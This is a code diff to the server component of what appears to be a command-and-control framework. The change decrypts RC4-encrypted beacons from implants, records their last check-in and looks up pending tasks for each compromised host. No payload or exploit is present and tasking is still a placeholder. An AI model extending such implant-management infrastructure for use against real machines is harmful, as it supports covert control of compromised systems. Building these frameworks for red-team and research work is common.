@@ -126,26 +126,39 @@ class WebServer(object):
                     if "hostname" in self.crypt(row[0], raw_data):
                         key = row[0]
 
-            # JSON decodes POST data
-            j = json.loads(self.crypt(row[0], raw_data))
-            hostname = j["hostname"]
-            current_user = j["current_user"]
-            process_id = j["process_id"]
-            operating_system = j["operating_system"]
+                        # JSON decodes POST data
+                        j = json.loads(self.crypt(row[0], raw_data))
+                        hostname = j["hostname"]
+                        current_user = j["current_user"]
+                        process_id = j["process_id"]
+                        operating_system = j["operating_system"]
 
-            # updates "last_beacon" time in "implants" table
-            with self.connection:
-                cursor = self.connection.cursor()
-                cursor.execute("""UPDATE implants SET last_beacon = ?
-                                  WHERE hostname = ?
-                                  AND process_id = ?""",
-                               (current_time,
-                                hostname,
-                                process_id))
+                        # updates "last_beacon" time in "implants" table
+                        # uses previous cursor
+                        cursor.execute("""UPDATE implants SET last_beacon = ?
+                                          WHERE hostname = ?
+                                          AND process_id = ?""",
+                                       (current_time,
+                                        hostname,
+                                        process_id))
 
-                # TO DO: checks for implant tasking
+                        # checks for implant tasking
+                        # only returns one tasking
+                        cursor.execute("""SELECT task_id, task_action, task_secondary FROM tasks
+                                          WHERE hostname = ?
+                                          AND process_id = ?""",
+                                       (hostname,
+                                        process_id))
+                        result = cursor.fetchone()
 
-            return "RC4 beacon"
+                        # if we have tasking
+                        if result is not None:
+                            return "we have tasking"
+
+                        # else we return a blank response
+                        # Flask will error if we do not have a response
+                        else:
+                            return ""
 
     def start_flask_server(self, protocol, external_address, port, profile):
         """
